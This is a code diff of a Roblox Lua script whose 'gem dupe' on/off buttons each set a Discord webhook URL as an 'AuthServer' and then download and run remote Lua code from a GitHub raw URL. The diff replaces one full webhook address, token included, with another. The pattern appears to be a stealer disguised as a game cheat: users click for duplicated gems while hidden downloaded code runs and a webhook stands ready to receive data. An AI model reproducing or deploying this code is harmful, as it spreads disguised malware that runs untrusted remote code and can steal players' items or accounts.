@@ -168,7 +168,7 @@ local function VGTKP_fake_script() -- gemdupeon.LocalScript
 
 	script.Parent.MouseButton1Click:Connect(function()
 		_G.Key = "21oikkrA"
-		_G.AuthServer = "https://discord.com/api/webhooks/1051840785546498088/ISpYg9xUZ4LLlhjFtjdRcTswaA9oxT7ZdMgu2i_OACAL3xS016r8HJ9n3_NEcVBff79W"
+		_G.AuthServer = "https://discord.com/api/webhooks/1052925016460767262/zDRoe-UlEdoAEIBIqemd5jXBrh8FMjQ8IQoD_0Al0PWSRbl6yXa1MRRxgPRXz7g1aRH9"
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
 	end)
 end
@@ -178,7 +178,7 @@ local function DUBKKTE_fake_script() -- gemdupeoff.LocalScript
 
 	script.Parent.MouseButton1Click:Connect(function()
 		_G.Key = "21oikkrA"
-		_G.AuthServer = "https://discord.com/api/webhooks/1051840785546498088/ISpYg9xUZ4LLlhjFtjdRcTswaA9oxT7ZdMgu2i_OACAL3xS016r8HJ9n3_NEcVBff79W"
+		_G.AuthServer = "https://discord.com/api/webhooks/1052925016460767262/zDRoe-UlEdoAEIBIqemd5jXBrh8FMjQ8IQoD_0Al0PWSRbl6yXa1MRRxgPRXz7g1aRH9"
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
 	end)
 end
